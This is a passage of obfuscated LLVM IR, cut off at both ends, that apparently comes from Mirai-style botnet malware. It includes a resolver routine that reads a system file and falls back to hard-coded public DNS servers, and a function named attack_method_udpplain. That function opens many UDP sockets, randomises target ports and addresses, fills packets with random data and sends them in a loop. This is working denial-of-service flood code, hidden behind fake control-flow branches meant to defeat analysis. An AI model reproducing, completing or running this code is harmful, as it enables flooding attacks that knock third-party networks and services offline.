  store i32 %61, i32* %14, align 4
  br label %62

; <label>:62:                                     ; preds = %228, %60
  %63 = load i32, i32* @x.39
  %64 = load i32, i32* @y.40
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i32, i32* %14, align 4
  %72 = load i32, i32* %11, align 4
  %73 = icmp slt i32 %71, %72
  %74 = load i32, i32* @x.39
  %75 = load i32, i32* @y.40
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %73, label %82, label %231

; <label>:82:                                     ; preds = %originalBBpart28
  %83 = load i32, i32* %14, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 %84
  %86 = load i8, i8* %85, align 1
  store i8 %86, i8* %18, align 1
  %87 = load i8, i8* %16, align 1
  %88 = icmp ne i8 %87, 0
  br i1 %88, label %164, label %89

; <label>:89:                                     ; preds = %82
  %90 = load i32, i32* @x.39
  %91 = load i32, i32* @y.40
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %89
  %98 = load i8, i8* %18, align 1
  %99 = sext i8 %98 to i32
  %100 = icmp eq i32 %99, 32
  %101 = load i32, i32* @x.39
  %102 = load i32, i32* @y.40
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %100, label %129, label %109

; <label>:109:                                    ; preds = %originalBBpart212
  %110 = load i32, i32* @x.39
  %111 = load i32, i32* @y.40
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %109
  %118 = load i8, i8* %18, align 1
  %119 = sext i8 %118 to i32
  %120 = icmp eq i32 %119, 9
  %121 = load i32, i32* @x.39
  %122 = load i32, i32* @y.40
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %120, label %129, label %146

; <label>:129:                                    ; preds = %originalBBpart216, %originalBBpart212
  %130 = load i32, i32* @x.39
  %131 = load i32, i32* @y.40
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %129
  %138 = load i32, i32* @x.39
  %139 = load i32, i32* @y.40
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %228

; <label>:146:                                    ; preds = %originalBBpart216
  store i8 1, i8* %16, align 1
  br label %147

; <label>:147:                                    ; preds = %146
  %148 = load i32, i32* @x.39
  %149 = load i32, i32* @y.40
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %147
  %156 = load i32, i32* @x.39
  %157 = load i32, i32* @y.40
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %164

; <label>:164:                                    ; preds = %originalBBpart224, %82
  %165 = load i8, i8* %18, align 1
  %166 = sext i8 %165 to i32
  %167 = icmp ne i32 %166, 46
  br i1 %167, label %168, label %208

; <label>:168:                                    ; preds = %164
  %169 = load i32, i32* @x.39
  %170 = load i32, i32* @y.40
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %168
  %177 = load i8, i8* %18, align 1
  %178 = sext i8 %177 to i32
  %179 = icmp slt i32 %178, 48
  %180 = load i32, i32* @x.39
  %181 = load i32, i32* @y.40
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %179, label %213, label %188

; <label>:188:                                    ; preds = %originalBBpart228
  %189 = load i32, i32* @x.39
  %190 = load i32, i32* @y.40
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %188
  %197 = load i8, i8* %18, align 1
  %198 = sext i8 %197 to i32
  %199 = icmp sgt i32 %198, 57
  %200 = load i32, i32* @x.39
  %201 = load i32, i32* @y.40
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %199, label %213, label %208

; <label>:208:                                    ; preds = %originalBBpart232, %164
  %209 = load i32, i32* %14, align 4
  %210 = load i32, i32* %11, align 4
  %211 = sub nsw i32 %210, 1
  %212 = icmp eq i32 %209, %211
  br i1 %212, label %213, label %227

; <label>:213:                                    ; preds = %208, %originalBBpart232, %originalBBpart228
  %214 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %215 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %216 = load i32, i32* %12, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds i8, i8* %215, i64 %217
  %219 = load i32, i32* %14, align 4
  %220 = load i32, i32* %12, align 4
  %221 = sub nsw i32 %219, %220
  call void @util_memcpy(i8* %214, i8* %218, i32 %221)
  %222 = load i32, i32* %14, align 4
  %223 = load i32, i32* %12, align 4
  %224 = sub nsw i32 %222, %223
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %225
  store i8 0, i8* %226, align 1
  store i8 1, i8* %17, align 1
  br label %231

; <label>:227:                                    ; preds = %208
  br label %228

; <label>:228:                                    ; preds = %227, %originalBBpart220
  %229 = load i32, i32* %14, align 4
  %230 = add nsw i32 %229, 1
  store i32 %230, i32* %14, align 4
  br label %62

; <label>:231:                                    ; preds = %213, %originalBBpart28
  %232 = load i32, i32* @x.39
  %233 = load i32, i32* @y.40
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %231
  %240 = load i8, i8* %17, align 1
  %241 = icmp ne i8 %240, 0
  %242 = load i32, i32* @x.39
  %243 = load i32, i32* @y.40
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %241, label %250, label %253

; <label>:250:                                    ; preds = %originalBBpart236
  %251 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %252 = call i32 @inet_addr(i8* %251) #6
  store i32 %252, i32* %9, align 4
  br label %298

; <label>:253:                                    ; preds = %originalBBpart236
  %254 = load i32, i32* @x.39
  %255 = load i32, i32* @y.40
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %253
  %262 = load i32, i32* @x.39
  %263 = load i32, i32* @y.40
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %270

; <label>:270:                                    ; preds = %originalBBpart240, %originalBBpart24
  %271 = load i32, i32* @x.39
  %272 = load i32, i32* @y.40
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %270
  %279 = load i32, i32* @x.39
  %280 = load i32, i32* @y.40
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %287

; <label>:287:                                    ; preds = %originalBBpart244, %originalBBpart2
  %288 = call i32 @rand_next()
  %289 = urem i32 %288, 4
  switch i32 %289, label %298 [
    i32 0, label %290
    i32 1, label %292
    i32 2, label %294
    i32 3, label %296
  ]

; <label>:290:                                    ; preds = %287
  %291 = call i32 @htonl(i32 134744072) #7
  store i32 %291, i32* %9, align 4
  br label %298

; <label>:292:                                    ; preds = %287
  %293 = call i32 @htonl(i32 1246898730) #7
  store i32 %293, i32* %9, align 4
  br label %298

; <label>:294:                                    ; preds = %287
  %295 = call i32 @htonl(i32 1074151430) #7
  store i32 %295, i32* %9, align 4
  br label %298

; <label>:296:                                    ; preds = %287
  %297 = call i32 @htonl(i32 67240450) #7
  store i32 %297, i32* %9, align 4
  br label %298

; <label>:298:                                    ; preds = %296, %294, %292, %290, %287, %250
  %299 = load i32, i32* %9, align 4
  ret i32 %299

originalBBalteredBB:                              ; preds = %originalBB, %0
  %300 = alloca i32, align 4
  %301 = alloca i32, align 4
  %302 = alloca i32, align 4
  %303 = alloca i32, align 4
  %304 = alloca [2048 x i8], align 16
  %305 = alloca i32, align 4
  %306 = alloca [32 x i8], align 16
  %307 = alloca i8, align 1
  %308 = alloca i8, align 1
  %309 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %310 = call i8* @table_retrieve_val(i32 21, i32* null)
  %311 = call i32 (i8*, i32, ...) @open(i8* %310, i32 0)
  store i32 %311, i32* %301, align 4
  call void @table_lock_val(i8 zeroext 21)
  %312 = load i32, i32* %301, align 4
  %313 = icmp sge i32 %312, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %314 = load i32, i32* %10, align 4
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %316 = call i64 @read(i32 %314, i8* %315, i64 2048)
  %317 = trunc i64 %316 to i32
  store i32 %317, i32* %11, align 4
  %318 = load i32, i32* %10, align 4
  %319 = call i32 @close(i32 %318)
  call void @table_unlock_val(i8 zeroext 22)
  %320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %321 = load i32, i32* %11, align 4
  %322 = call i8* @table_retrieve_val(i32 22, i32* null)
  %323 = call i32 @util_stristr(i8* %320, i32 %321, i8* %322)
  store i32 %323, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 22)
  %324 = load i32, i32* %12, align 4
  %325 = icmp ne i32 %324, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %326 = load i32, i32* %14, align 4
  %327 = load i32, i32* %11, align 4
  %328 = icmp slt i32 %326, %327
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %89
  %329 = load i8, i8* %18, align 1
  %330 = sext i8 %329 to i32
  %331 = icmp eq i32 %330, 32
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %109
  %332 = load i8, i8* %18, align 1
  %333 = sext i8 %332 to i32
  %334 = icmp eq i32 %333, 9
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %129
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %147
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %168
  %335 = load i8, i8* %18, align 1
  %336 = sext i8 %335 to i32
  %337 = icmp slt i32 %336, 48
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %188
  %338 = load i8, i8* %18, align 1
  %339 = sext i8 %338 to i32
  %340 = icmp sgt i32 %339, 57
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %231
  %341 = load i8, i8* %17, align 1
  %342 = icmp ne i8 %341, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %253
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %270
  br label %originalBB42
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %202, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %205

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = load i32, i32* @x.41
  %100 = load i32, i32* @y.42
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %98
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %107, align 4
  %108 = load i16, i16* %13, align 2
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %108, i16* %109, align 2
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %111 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %110, i32 0, i32 0
  store i32 0, i32* %111, align 4
  %112 = load i32*, i32** %11, align 8
  %113 = load i32, i32* %9, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %112, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %118 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %118, %struct.sockaddr** %117, align 8
  %119 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %120 = load %struct.sockaddr*, %struct.sockaddr** %119, align 8
  %121 = call i32 @bind(i32 %116, %struct.sockaddr* %120, i32 16) #6
  %122 = icmp eq i32 %121, -1
  %123 = load i32, i32* @x.41
  %124 = load i32, i32* @y.42
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %122, label %131, label %148

; <label>:131:                                    ; preds = %originalBBpart2
  %132 = load i32, i32* @x.41
  %133 = load i32, i32* @y.42
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %131
  %140 = load i32, i32* @x.41
  %141 = load i32, i32* @y.42
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %148

; <label>:148:                                    ; preds = %originalBBpart24, %originalBBpart2
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = icmp slt i32 %155, 32
  br i1 %156, label %157, label %183

; <label>:157:                                    ; preds = %148
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 1
  %163 = load i32, i32* %162, align 4
  %164 = call i32 @ntohl(i32 %163) #7
  %165 = call i32 @rand_next()
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 2
  %171 = load i8, i8* %170, align 4
  %172 = zext i8 %171 to i32
  %173 = lshr i32 %165, %172
  %174 = add i32 %164, %173
  %175 = call i32 @htonl(i32 %174) #7
  %176 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i64 %178
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i32 0, i32 0
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %180, i32 0, i32 2
  %182 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %181, i32 0, i32 0
  store i32 %175, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %157, %148
  %184 = load i32*, i32** %11, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i32, i32* %184, i64 %186
  %188 = load i32, i32* %187, align 4
  %189 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 0
  %195 = bitcast %struct.sockaddr_in* %194 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %189, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i32 @connect(i32 %188, %struct.sockaddr* %197, i32 16)
  %199 = icmp eq i32 %198, -1
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %183
  br label %201

; <label>:201:                                    ; preds = %200, %183
  br label %202

; <label>:202:                                    ; preds = %201
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %58

; <label>:205:                                    ; preds = %58
  br label %206

; <label>:206:                                    ; preds = %originalBBpart223, %205
  store i32 0, i32* %9, align 4
  br label %207

; <label>:207:                                    ; preds = %originalBBpart219, %206
  %208 = load i32, i32* %9, align 4
  %209 = load i8, i8* %5, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp slt i32 %208, %210
  br i1 %211, label %212, label %285

; <label>:212:                                    ; preds = %207
  %213 = load i8**, i8*** %10, align 8
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds i8*, i8** %213, i64 %215
  %217 = load i8*, i8** %216, align 8
  store i8* %217, i8** %22, align 8
  %218 = load i8, i8* %15, align 1
  %219 = icmp ne i8 %218, 0
  br i1 %219, label %220, label %240

; <label>:220:                                    ; preds = %212
  %221 = load i32, i32* @x.41
  %222 = load i32, i32* @y.42
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %220
  %229 = load i8*, i8** %22, align 8
  %230 = load i16, i16* %14, align 2
  %231 = zext i16 %230 to i32
  call void @rand_str(i8* %229, i32 %231)
  %232 = load i32, i32* @x.41
  %233 = load i32, i32* @y.42
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %240

; <label>:240:                                    ; preds = %originalBBpart28, %212
  %241 = load i32, i32* @x.41
  %242 = load i32, i32* @y.42
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %240
  %249 = load i32*, i32** %11, align 8
  %250 = load i32, i32* %9, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds i32, i32* %249, i64 %251
  %253 = load i32, i32* %252, align 4
  %254 = load i8*, i8** %22, align 8
  %255 = load i16, i16* %14, align 2
  %256 = zext i16 %255 to i64
  %257 = call i64 @send(i32 %253, i8* %254, i64 %256, i32 16384)
  %258 = load i32, i32* @x.41
  %259 = load i32, i32* @y.42
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
